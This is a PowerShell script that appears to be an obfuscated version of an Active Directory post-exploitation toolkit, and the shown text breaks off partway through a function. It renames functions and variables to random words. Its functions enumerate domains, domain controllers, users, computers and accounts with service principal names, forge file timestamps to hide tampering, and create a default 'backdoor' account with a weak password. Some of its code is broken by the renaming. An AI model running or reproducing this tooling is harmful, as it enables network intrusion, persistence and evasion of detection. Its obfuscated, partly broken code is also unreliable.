function sewers
{
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $NweiILKX99 = [AppDomain]::CurrentDomain.GetAssemblies()
    foreach ($MeMYynqh99 in $NweiILKX99) {
        if ($MeMYynqh99.FullName -and ($MeMYynqh99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $MeMYynqh99
        }
    }
    $UEgaSSwp99 = New-Object Reflection.AssemblyName($ModuleName)
    $dOCGgZVW99 = [AppDomain]::CurrentDomain
    $IWNorWDu99 = $dOCGgZVW99.DefineDynamicAssembly($UEgaSSwp99, 'Run')
    $pFJrMpmG99 = $IWNorWDu99.DefineDynamicModule($ModuleName, $False)
    return $pFJrMpmG99
}
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [Switch]
        $SetLastError
    )
    $FrdSCUXu99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $FrdSCUXu99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $FrdSCUXu99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $FrdSCUXu99['Charset'] = $Charset }
    if ($SetLastError) { $FrdSCUXu99['SetLastError'] = $SetLastError }
    New-Object PSObject -Property $FrdSCUXu99
}
function cruelest
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $XjigTcXD99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $XjigTcXD99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $XjigTcXD99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$XjigTcXD99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $XjigTcXD99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $XjigTcXD99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $iYnUkXQB99 = $XjigTcXD99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($hUosgNqo99 in $ParameterTypes)
            {
                if ($hUosgNqo99.IsByRef)
                {
                    [void] $iYnUkXQB99.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $CAGrDSMx99 = [Runtime.InteropServices.DllImportAttribute]
            $NaRwYRno99 = $CAGrDSMx99.GetField('SetLastError')
            $SngvBDyL99 = $CAGrDSMx99.GetField('CallingConvention')
            $FyAaKqPz99 = $CAGrDSMx99.GetField('CharSet')
            if ($SetLastError) { $coJgnINY99 = $True } else { $coJgnINY99 = $False }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $oNmmbbDs99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($NaRwYRno99, $SngvBDyL99, $FyAaKqPz99),
                [Object[]] @($coJgnINY99, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
            $iYnUkXQB99.SetCustomAttribute($oNmmbbDs99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $XjigTcXD99
        }
        $udDVYKhK99 = @{}
        foreach ($Key in $XjigTcXD99.Keys)
        {
            $Type = $XjigTcXD99[$Key].CreateType()
            
            $udDVYKhK99[$Key] = $Type
        }
        return $udDVYKhK99
    }
}
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $DZzQKoGR99,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        
        [Parameter(Position = 2)]
        [UInt16]
        $wjIivkrY99,
        
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $DZzQKoGR99
        Type = $Type -as [Type]
        Offset = $wjIivkrY99
        MarshalAs = $MarshalAs
    }
}
function presumptions
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GxCdPKyF99,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $qHXFZvEu99,
        [Reflection.Emit.PackingSize]
        $rurXVWvi99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $dSDUoegm99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($GxCdPKyF99))
    }
    [Reflection.TypeAttributes] $qdEySvLZ99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($dSDUoegm99)
    {
        $qdEySvLZ99 = $qdEySvLZ99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $qdEySvLZ99 = $qdEySvLZ99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $iJUfwPiT99 = $Module.DefineType($GxCdPKyF99, $qdEySvLZ99, [ValueType], $rurXVWvi99)
    $AIhbEiWS99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $yslXaQdw99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $KTrwLDQT99 = New-Object Hashtable[]($qHXFZvEu99.Count)
    foreach ($Field in $qHXFZvEu99.Keys)
    {
        $Index = $qHXFZvEu99[$Field]['Position']
        $KTrwLDQT99[$Index] = @{FieldName = $Field; Properties = $qHXFZvEu99[$Field]}
    }
    foreach ($Field in $KTrwLDQT99)
    {
        $IryhjYQy99 = $Field['FieldName']
        $cwUGylZy99 = $Field['Properties']
        $wjIivkrY99 = $cwUGylZy99['Offset']
        $Type = $cwUGylZy99['Type']
        $MarshalAs = $cwUGylZy99['MarshalAs']
        $VIfPFdXf99 = $iJUfwPiT99.DefineField($IryhjYQy99, $Type, 'Public')
        if ($MarshalAs)
        {
            $RVQKYzlP99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $DVaxcfbT99 = New-Object Reflection.Emit.CustomAttributeBuilder($AIhbEiWS99,
                    $RVQKYzlP99, $yslXaQdw99, @($Size))
            }
            else
            {
                $DVaxcfbT99 = New-Object Reflection.Emit.CustomAttributeBuilder($AIhbEiWS99, [Object[]] @($RVQKYzlP99))
            }
            
            $VIfPFdXf99.SetCustomAttribute($DVaxcfbT99)
        }
        if ($dSDUoegm99) { $VIfPFdXf99.SetOffset($wjIivkrY99) }
    }
    $ycyiYWNA99 = $iJUfwPiT99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $TiHfkWuT99 = $ycyiYWNA99.GetILGenerator()
    $TiHfkWuT99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $iJUfwPiT99)
    $TiHfkWuT99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $TiHfkWuT99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $TiHfkWuT99.Emit([Reflection.Emit.OpCodes]::Ret)
    $vgYOZtkY99 = $iJUfwPiT99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $iJUfwPiT99,
        [Type[]] @([IntPtr]))
    $uRQBNtjN99 = $vgYOZtkY99.GetILGenerator()
    $uRQBNtjN99.Emit([Reflection.Emit.OpCodes]::Nop)
    $uRQBNtjN99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $uRQBNtjN99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $iJUfwPiT99)
    $uRQBNtjN99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $uRQBNtjN99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $uRQBNtjN99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $iJUfwPiT99)
    $uRQBNtjN99.Emit([Reflection.Emit.OpCodes]::Ret)
    $iJUfwPiT99.CreateType()
}
function supernovae {
    [CmdletBinding()]
    param( 
        [Array]$Array 
    )
    Begin{}
    Process{
        $len = $Array.Length
        while($len){
            $i = Get-Random ($len --)
            $tmp = $Array[$len]
            $Array[$len] = $Array[$i]
            $Array[$i] = $tmp
        }
        $Array;
    }
}
function freebees {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [String] $Path
    )
    Begin{}
    
    Process{
        try { 
            $YKmvSgdX99 = [IO.FILE]::OpenWrite($Path)
            $YKmvSgdX99.close()
            $true
        }
        catch {
            Write-Verbose -Message $Error[0]
            $false
        }
    }
    
    End{}
}
function fattier {
    [CmdletBinding(DefaultParameterSetName='Delimiter',
            SupportsShouldProcess=$true, 
    ConfirmImpact='Medium')]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true)]
        [System.Management.Automation.PSObject]
        $PQlOtdrM99,
        
        [Parameter(Mandatory=$true, Position=0)]
        [Alias('PSPath')]
        [System.String]
        $Path,
        
        [Switch]
        $zUlyMMyD99,
        
        [Switch]
        $Force,
        
        [Switch]
        $nGzgnTRs99,
        
        [ValidateSet('Unicode','UTF7','UTF8','ASCII','UTF32','BigEndianUnicode','Default','OEM')]
        [System.String]
        $lIdqUpZf99,
        
        [Parameter(ParameterSetName='Delimiter', Position=1)]
        [ValidateNotNull()]
        [System.Char]
        $zhgTNgVD99,
        
        [Parameter(ParameterSetName='UseCulture')]
        [Switch]
        $JxOLgUNu99,
        
        [Alias('NTI')]
        [Switch]
        $VpBKWzDE99
    )
    
    Begin
    {
        $pSVzdCQe99 = $false
        
        try {
            $qIOioBtm99 = $null
            if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$qIOioBtm99))
            {
                $PSBoundParameters['OutBuffer'] = 1
            }
            $DOhZTHnR99 = $ExecutionContext.InvokeCommand.GetCommand('Export-Csv',
            [System.Management.Automation.CommandTypes]::Cmdlet)
            
            
            $FymLcMlt99 = ''
            
            if ($zUlyMMyD99) {
                
                $PSBoundParameters.Remove('Append') | Out-Null
                
                if ($Path) {
                    if (Test-Path -Path $Path) {        
                        $pSVzdCQe99 = $true
                        
                        if ($lIdqUpZf99.Length -eq 0) {
                            $lIdqUpZf99 = 'ASCII'
                        }
                        
                        $FymLcMlt99 += 'ConvertTo-Csv -VpBKWzDE99 '
                        
                        if ( $JxOLgUNu99 ) {
                            $FymLcMlt99 += ' -JxOLgUNu99 '
                        }
                        
                        if ( $zhgTNgVD99 ) {
                            $FymLcMlt99 += " -zhgTNgVD99 '$zhgTNgVD99' "
                        } 
                        
                        $FymLcMlt99 += ' | Foreach-Object {$start=$true}'
                        $FymLcMlt99 += '{if ($start) {$start=$false} else {$_}} '
                        
                        $FymLcMlt99 += " | Out-File -ubSZiedp99 '$Path' -lIdqUpZf99 '$lIdqUpZf99' -zUlyMMyD99 "
                        
                        if ($Force) {
                            $FymLcMlt99 += ' -Force'
                        }
                        
                        if ($nGzgnTRs99) {
                            $FymLcMlt99 += ' -nGzgnTRs99'
                        }   
                    }
                }
            } 
            $FygbdduU99 = {& $DOhZTHnR99 @PSBoundParameters }
            
            if ( $pSVzdCQe99 ) {
                $FygbdduU99 = $ExecutionContext.InvokeCommand.NewScriptBlock(
                    $FymLcMlt99
                )
            } else {
                $FygbdduU99 = $ExecutionContext.InvokeCommand.NewScriptBlock(
                    [string]$FygbdduU99
                )
            }
            
            $EvmXmqiE99 = $FygbdduU99.GetSteppablePipeline($myInvocation.CommandOrigin)
            $EvmXmqiE99.Begin($PSCmdlet)
            
        } 
        catch {
            throw
        }
    }
    
    process
    {
        try {
            $EvmXmqiE99.Process($_)
        } catch {
            throw
        }
    }
    
    end
    {
        try {
            $EvmXmqiE99.End()
        } catch {
            throw
        }
    }
    
}
function gasps {
    [CmdletBinding(DefaultParameterSetName = 'Touch')] 
    Param (
        
        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ubSZiedp99,
        
        [Parameter(ParameterSetName = 'Touch')]
        [ValidateNotNullOrEmpty()]
        [String]
        $fxeWhuGx99,
        
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $IiZkMDXz99,
        
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $qtafonrE99,
        
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $jARVraYC99,
        
        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $xnavlvPV99
    )
    
    function alluding {
        
        param($VRwjGhRc99)
        
        if (!(Test-Path -Path $VRwjGhRc99)){Throw 'File Not Found'}
        $HKMkkuzu99 = (Get-Item $VRwjGhRc99)
        
        $rLMUftZF99 = @{'Modified' = ($HKMkkuzu99.LastWriteTime);
                              'Accessed' = ($HKMkkuzu99.LastAccessTime);
                              'Created' = ($HKMkkuzu99.CreationTime)};
        $LLCZwNHm99 = New-Object -TypeName PSObject -Property $rLMUftZF99
        Return $LLCZwNHm99
    } 
    
    if (!(Test-Path -Path $ubSZiedp99)){Throw "$ubSZiedp99 not found"}
    
    $HKMkkuzu99 = (Get-Item -Path $ubSZiedp99)
    
    if ($PSBoundParameters['AllMacAttributes']){
        $IiZkMDXz99 = $xnavlvPV99
        $qtafonrE99 = $xnavlvPV99
        $jARVraYC99 = $xnavlvPV99
    }
    
    if ($PSBoundParameters['OldFilePath']){
        
        if (!(Test-Path -Path $fxeWhuGx99)){Write-Error "$fxeWhuGx99 not found."}
        
        $ywQoXgqK99 = (alluding $fxeWhuGx99)
        $IiZkMDXz99 = $ywQoXgqK99.Modified
        $qtafonrE99 = $ywQoXgqK99.Accessed
        $jARVraYC99 = $ywQoXgqK99.Created
    }
    
    if ($IiZkMDXz99) {$HKMkkuzu99.LastWriteTime = $IiZkMDXz99}
    if ($qtafonrE99) {$HKMkkuzu99.LastAccessTime = $qtafonrE99}
    if ($jARVraYC99) {$HKMkkuzu99.CreationTime = $jARVraYC99}
    
    Return (alluding $ubSZiedp99)
}
function Ecuadorian {
    
    param(
        [Parameter(Mandatory = $True)]
        [String]
        $npUzNyMP99,
        [Parameter(Mandatory = $True)]
        [String]
        $CPJcZBHp99
    )
    
    gasps -ubSZiedp99 $npUzNyMP99 -fxeWhuGx99 $CPJcZBHp99
    
    Copy-Item -Path $npUzNyMP99 -Destination $CPJcZBHp99
}
function deltas {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = ''
    )
    try{
        $DAhAEpei99 = @(([net.dns]::GetHostEntry($uVOoDBse99)).AddressList)
        
        if ($DAhAEpei99.Count -ne 0){
            foreach ($dUvHVjaA99 in $DAhAEpei99) {
                if ($dUvHVjaA99.AddressFamily -eq 'InterNetwork') {
                    $dUvHVjaA99.IPAddressToString
                }
            }
        }
    }
    catch{ 
        Write-Verbose -Message 'Could not resolve host to an IP Address.'
    }
}
function disorganize {
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [String] 
        $LxIyYIwe99,
        
        [Switch]
        $RPC
    )
    
    if ($RPC){
        $MhbyJfTV99 = @{
                        namespace = 'root\cimv2'
                        Class = 'win32_ComputerSystem'
                        ComputerName = $Name
                        ErrorAction = 'Stop'
                      }
        if ($IHZtxRsN99 -ne $null)
        {
            $MhbyJfTV99.Credential = $IHZtxRsN99
        }
        try
        {
            Get-WmiObject @WMIParameters
        }
        catch { 
            Write-Verbose -Message 'Could not connect via WMI'
        } 
    }
    else{
        Test-Connection -ComputerName $LxIyYIwe99 -count 1 -Quiet
    }
}
function foxy {
    
    [CmdletBinding()]
    param(
        [Switch]
        $Base
    )
    
    if ($Base){
        $temp = [string] ([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.'
        $parts = $temp.split('.')
        $parts[0..($parts.length-2)] -join '.'
    }
    else{
        ([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.'
    }
}
function congested {
  
    [CmdletBinding()]
    param(
        [string]
        $EzDyomfw99
    )
    
    if($EzDyomfw99){
        $tMprKGkL99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $EzDyomfw99)
        try{
            [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($tMprKGkL99)
        }
        catch{
            Write-Warning "The specified forest $EzDyomfw99 does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else{
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }
}
function wettest {
    
    [CmdletBinding()]
    param(
        [string]
        $dOCGgZVW99,
        [string]
        $EzDyomfw99
    )
    
    if($dOCGgZVW99){
        if($dOCGgZVW99.Contains('*')){
            (congested -EzDyomfw99 $EzDyomfw99).Domains | Where-Object {$_.Name -like $dOCGgZVW99}
        }
        else{
            (congested -EzDyomfw99 $EzDyomfw99).Domains | Where-Object {$_.Name.ToLower() -eq $dOCGgZVW99.ToLower()}
        }
    }
    else{
        (congested -EzDyomfw99 $EzDyomfw99).Domains
    }
}
function popularly {
    
    [CmdletBinding()]
    param(
        [string]
        $dOCGgZVW99
    )
    
    if ($dOCGgZVW99){
        
        try{
            $fQhHoBDz99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $dOCGgZVW99)
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($fQhHoBDz99).DomainControllers
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
            $null
        }
    }
    else{
        [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
    }
}
function overshare {
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
}
function bounciest {
    
    [CmdletBinding()]
    param(
        [string]
        $EOQyLHjF99,
        [string]
        $OU,
        [string]
        $MBVLzigF99,
        [string]
        $dOCGgZVW99
    )
    
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if($OU){
                $dn = "OU=$OU,$dn"
            }
            if($MBVLzigF99){
                Write-Verbose "LDAP: $MBVLzigF99"
                $dn = $MBVLzigF99
            }
            if ($zrCEhkbw99){
                $blDLinPB99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn")
            }
            else{
                $blDLinPB99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }
            
            if($EOQyLHjF99){
                $blDLinPB99.filter="(&(samAccountType=805306368)(samAccountName=$EOQyLHjF99))"
            }
            else{
                $blDLinPB99.filter='(&(samAccountType=805306368))'
            }
            $blDLinPB99.PageSize = 200
            $blDLinPB99.FindAll() |ForEach-Object {$_.properties}
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        if($EOQyLHjF99){
            $blDLinPB99 = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$EOQyLHjF99*))"
        }
        elseif($OU){
            $dn = "OU=$OU," + ([adsi]'').distinguishedname
            $blDLinPB99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            $blDLinPB99.filter='(&(samAccountType=805306368))'
        }
        elseif($MBVLzigF99){
            $blDLinPB99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$MBVLzigF99")
            $blDLinPB99.filter='(&(samAccountType=805306368))'
        }
        else{
            $blDLinPB99 = [adsisearcher]'(&(samAccountType=805306368))'
        }
        $blDLinPB99.PageSize = 1000
        $blDLinPB99.FindAll() | ForEach-Object {$_.properties}
    }
}
function combinations {
    
    [CmdletBinding()]
    param(
        [string]
        $EOQyLHjF99,
        [string]
        $dOCGgZVW99
    )
    
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if ($zrCEhkbw99){
                $blDLinPB99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn")
            }
            else{
                $blDLinPB99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            
            if($EOQyLHjF99){
                $blDLinPB99.filter="(&(samAccountType=805306368)(samAccountName=$EOQyLHjF99))"
            }
            else{
                $blDLinPB99.filter='(&(samAccountType=805306368))'
            } 
            $blDLinPB99.FindAll() | ForEach-Object {
                if ($_.properties['ServicePrincipalName'].count -gt 0){
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'SamAccountName' $_.properties.samaccountname
                    $out | Add-Member Noteproperty 'ServicePrincipalName' $_.properties['ServicePrincipalName']
                    $out
                }   
            }
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        if($EOQyLHjF99){
            $blDLinPB99 = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$EOQyLHjF99*))"
        }
        else{
            $blDLinPB99 = [adsisearcher]'(&(samAccountType=805306368))'
        }
        $blDLinPB99.FindAll() | ForEach-Object {
            if ($_.properties['ServicePrincipalName'].count -gt 0){
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'samaccountname' $_.properties.samaccountname
                $out | Add-Member Noteproperty 'ServicePrincipalName' $_.properties['ServicePrincipalName']
                $out
            }   
        }
    }
}
function sweat {
    
    [CmdletBinding()]
    Param (
        [string]
        $EOQyLHjF99 = 'backdoor',
        [string]
        $HMcPgFiS99 = 'Password123!',
        [string]
        $YrweeofD99,
        [string]
        $uVOoDBse99 = 'localhost',
        [string]
        $dOCGgZVW99
    )
    
    if ($dOCGgZVW99){
        
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        
        
        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        
        try{
            $fQhHoBDz99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $dOCGgZVW99)
            $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($fQhHoBDz99)
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
            return $null
        }
        
        $ODBisMJv99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d
        
        $usr = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $ODBisMJv99
        
        $usr.name = $EOQyLHjF99
        $usr.SamAccountName = $EOQyLHjF99
        $usr.PasswordNotRequired = $false
        $usr.SetPassword($HMcPgFiS99)
        $usr.Enabled = $true
        
        try{
            $usr.Save()
            "[*] User $EOQyLHjF99 successfully created in domain $dOCGgZVW99"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else{
        $objOu = [ADSI]"WinNT://$uVOoDBse99"
        $NiLahJDc99 = $objOU.Create('User', $EOQyLHjF99)
        $NiLahJDc99.SetPassword($HMcPgFiS99)
        
        try{ 
            $b = $NiLahJDc99.SetInfo()
            "[*] User $EOQyLHjF99 successfully created on host $uVOoDBse99"
        }
        catch{
            Write-Warning '[!] Account already exists!'
            return
        }
    }
    
    if ($YrweeofD99){
        if ($dOCGgZVW99){
            monuments -EOQyLHjF99 $EOQyLHjF99 -YrweeofD99 $YrweeofD99 -dOCGgZVW99 $dOCGgZVW99
            "[*] User $EOQyLHjF99 successfully added to group $YrweeofD99 in domain $dOCGgZVW99"
        }
        else{
            monuments -EOQyLHjF99 $EOQyLHjF99 -YrweeofD99 $YrweeofD99 -uVOoDBse99 $uVOoDBse99
            "[*] User $EOQyLHjF99 successfully added to group $YrweeofD99 on host $uVOoDBse99"
        }
    }
    
}
function AOL {
    
    [CmdletBinding()]
    Param (
        [string]
        $uVOoDBse99 = '*',
        [string]
        $SPN = '*',
        [string]
        $lGUvsLVx99 = '*',
        [string]
        $pNqfhNew99 = '*',
        [Switch]
        $Ping,
        [Switch]
        $KACNAvrx99,
        [string]
        $dOCGgZVW99
    )
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if($zrCEhkbw99){
                $QBVQanaY99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn") 
            }
            else{
                $QBVQanaY99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            if ($pNqfhNew99 -ne '*'){
                $QBVQanaY99.filter="(&(objectClass=Computer)(dnshostname=$uVOoDBse99)(operatingsystem=$lGUvsLVx99)(operatingsystemservicepack=$pNqfhNew99)(servicePrincipalName=$SPN))"
            }
            else{
                $QBVQanaY99.filter="(&(objectClass=Computer)(dnshostname=$uVOoDBse99)(operatingsystem=$lGUvsLVx99)(servicePrincipalName=$SPN))"
            }
            
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        if ($pNqfhNew99 -ne '*'){
            $QBVQanaY99 = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$uVOoDBse99)(operatingsystem=$lGUvsLVx99)(operatingsystemservicepack=$pNqfhNew99)(servicePrincipalName=$SPN))"
        }
        else{
            $QBVQanaY99 = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$uVOoDBse99)(operatingsystem=$lGUvsLVx99)(servicePrincipalName=$SPN))"
        }
    }
    
    if ($QBVQanaY99){
        
        $QBVQanaY99.PageSize = 200
        
        $QBVQanaY99.FindAll() | ForEach-Object {
            $up = $true
            if($Ping){
                $up = disorganize -LxIyYIwe99 $_.properties.dnshostname
            }
            if($up){
                if ($KACNAvrx99){
                    $_.properties
                }
                else{
                    $_.properties.dnshostname
                }
            }
        }
    }
}
function arable {
    [CmdletBinding()]
    Param (
        [string]
        $PAcupOCk99 = '*',
        [Switch]
        $KACNAvrx99,
        [string]
        $dOCGgZVW99
    )
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if($zrCEhkbw99){
                $bbCqhcdN99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn") 
            }
            else{
                $bbCqhcdN99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            $bbCqhcdN99.filter="(&(objectCategory=organizationalUnit)(name=$PAcupOCk99))"
            
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $bbCqhcdN99 = [adsisearcher]"(&(objectCategory=organizationalUnit)(name=$PAcupOCk99))"
    }
    
    if ($bbCqhcdN99){
        
        $bbCqhcdN99.PageSize = 200
        
        $bbCqhcdN99.FindAll() | ForEach-Object {
            if ($KACNAvrx99){
                $_.properties
            }
            else{
                $_.properties.adspath
            }
        }
    }
}
function travelog {
    
    [CmdletBinding()]
    param(
        [string]
        $YrweeofD99 = '*',
        [string]
        $dOCGgZVW99,
        [switch]
        $KACNAvrx99
    )
    
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if($zrCEhkbw99){
                $LzgrLlFw99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn")
            }
            else{
